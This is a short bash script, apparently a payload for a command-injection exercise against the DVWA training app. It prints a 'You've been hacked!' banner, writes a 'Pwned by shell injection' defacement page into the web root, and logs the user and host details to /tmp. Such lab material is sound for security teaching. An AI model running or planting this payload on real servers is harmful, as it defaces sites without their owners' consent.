#!/bin/bash

# Only run if 127.0.0.1 is reachable (simulating a basic injection pre-check)
ping -c 1 127.0.0.1 > /dev/null && clear

# Display red banner (terminal visual)
echo -e "\e[31m"
echo "######################################"
echo "#        You've been hacked!         #"
echo "######################################"
echo -e "\e[0m"

# Drop a 'proof' web page in DVWA web root
echo "<h1 style='color:red;'>Pwned by shell injection</h1>" > /var/www/html/hacked.html

# Capture basic host info (for simulation)
echo "[+] Host Compromised" > /tmp/pwned.txt
echo "User: $(whoami)" >> /tmp/pwned.txt
echo "Hostname: $(hostname)" >> /tmp/pwned.txt
echo "Time: $(date)" >> /tmp/pwned.txt
echo "Marker page: /var/www/html/hacked.html" >> /tmp/pwned.txt

# Optional: Print to screen
cat /tmp/pwned.txt
